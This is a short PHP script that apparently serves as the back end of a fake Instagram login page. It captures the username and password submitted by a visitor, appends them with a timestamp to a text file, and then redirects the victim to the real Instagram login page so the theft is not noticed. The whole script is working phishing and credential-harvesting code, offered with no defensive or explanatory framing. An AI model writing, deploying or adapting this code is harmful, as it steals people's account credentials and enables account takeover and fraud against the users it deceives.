<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$entry = "Instagram | Username: " . $username . " | Pass: " . $password . " | Time: " . date('Y-m-d H:i:s') . "\n";
file_put_contents("usernames.txt", $entry, FILE_APPEND);

// Redirect to real Instagram login
header('Location: https://www.instagram.com/accounts/login/');
exit();
?>